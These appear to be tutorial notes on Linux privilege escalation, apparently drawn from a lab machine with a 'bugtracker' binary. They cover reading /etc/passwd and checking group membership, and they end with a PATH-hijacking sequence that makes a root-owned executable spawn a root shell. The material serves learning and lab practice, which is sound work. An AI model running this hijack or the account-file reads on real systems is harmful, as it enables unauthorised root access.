## /etc/passwd
This is a file that we can find in all the Linux machines. Once we have gained access to a machine and we want to escalate our privileges we can take a look to this file to see what users are registered in the machine. The fields that we can find for each row are: 
 - Username
 - Password
 - User ID
 - Primary Group ID 
 - User Information
 - Home Directory
 - Shell
```bash
cat /etc/passwd

#Example of a row:
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

## id
Something we can do to gain privileges is to observe the groups our current user belongs to, to see if there's any uncommon one and take advantage of it to exploit a vulnerability.
```bash
#command:
id                                     
#possible putput:
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
If we observe the output, we can see that Robert is in the bugtracker group, what it's not common.

## locate
It is a command that locates if there is any file with this name. This can be useful, for example, if we want to locate a user or a group.
```bash
#command:
locate bugtracker
#possible output:
/usr/bin/bugtracker
```

## find
This command is used to search for files and directories within a specified directory hierarchy. It searches recursively through the directory structure, starting from the given directory, and matches files and directories based on specified criteria.

- Parameters:
	 - `-name <pattern>`: Matches files and directories with the specified name pattern.
	- `-type <type>`: Matches files or directories of the specified type, such as `f` for regular files or `d` for directories.
	- `-size <size>`: Matches files based on size, such as `+10M` for files larger than 10 megabytes or `-100K` for files smaller than 100 kilobytes.
	- `-user <username>`: Matches files owned by the specified username.

```bash
find [path] [expression]
```
## Files privilege
When gaining privileges, paying attention to the permissions assigned to each file can provide a significant advantage. For instance, if a file has execution permissions and it belongs to the root user, but you can execute it as a regular user, this can be a potential vulnerability.

If, for example, this file (bugtruck) is affected by the vulnerability described, and this executable allows us to input commands in some way, we could make it perform the following:
```bash
echo "/bin/sh" > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
bugtracker /tmp/cat
```
Bugtracker executes files with root privileges depending on the path you specify. With the commands we've made, we make it execute the command responsible for creating a new shell, doing so with root privileges.